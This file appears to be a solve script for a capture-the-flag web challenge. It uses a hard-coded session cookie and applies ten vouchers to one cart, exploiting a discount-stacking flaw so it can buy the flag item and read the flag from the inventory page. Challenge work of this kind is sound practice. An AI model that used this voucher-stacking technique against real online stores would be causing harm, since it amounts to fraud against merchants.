import requests
import time
import re

BASE_URL = "http://chal.sieberr.live:22003"
# Use the cookie from the previous successful login
COOKIES = {"connect.sid": "s%3AzhklAcTdyfpXqbkZIkFlya44EHBktIp6.r8UT5nwJdVz62uXjDOCg7h76nbjT5zpqrBQHTzQETxc"}

def add_to_cart(item_id):
    print(f"[*] Adding item {item_id} to cart...")
    r = requests.post(f"{BASE_URL}/cart/add", cookies=COOKIES, data={"item_id": item_id})
    print(f"    Response: {r.text}")

def get_voucher():
    print("[*] Issuing a new voucher...")
    r = requests.get(f"{BASE_URL}/voucher/issue", cookies=COOKIES)
    # Extract voucher from the page
    # <div class="voucher-code" id="voucherCode">...</div>
    match = re.search(r'id="voucherCode">(.*?)</div>', r.text)
    if match:
        return match.group(1)
    return None

def apply_voucher(voucher):
    print(f"[*] Applying voucher: {voucher[:20]}...")
    r = requests.post(f"{BASE_URL}/voucher/apply", cookies=COOKIES, data={"voucher": voucher})
    print(f"    Response: {r.text}")

def checkout():
    print("[*] Checking out...")
    r = requests.post(f"{BASE_URL}/cart/checkout", cookies=COOKIES)
    print(f"    Response: {r.text}")

def get_inventory():
    print("[*] Checking inventory...")
    r = requests.get(f"{BASE_URL}/inventory", cookies=COOKIES)
    return r.text

def main():
    # 1. Add FLAG to cart
    add_to_cart(6)

    # 2. Get 10 unique vouchers
    vouchers = []
    for i in range(10):
        v = get_voucher()
        if v:
            vouchers.append(v)
            print(f"    Got voucher {i+1}/10")
            # Wait a bit to ensure unique 'iat' if needed, though JWT might be unique anyway
            time.sleep(1.1) 
        else:
            print("    Failed to get voucher")

    # 3. Apply all vouchers
    for v in vouchers:
        apply_voucher(v)

    # 4. Checkout
    checkout()

    # 5. Get Flag
    inventory = get_inventory()
    # Find the flag in the inventory page
    # <div class="secret">...</div>
    match = re.search(r'<div class="secret">(.*?)</div>', inventory)
    if match:
        print(f"\n[+] FLAG FOUND: {match.group(1)}")
    else:
        print("\n[-] Flag not found in inventory.")
        print(inventory)

if __name__ == "__main__":
    main()
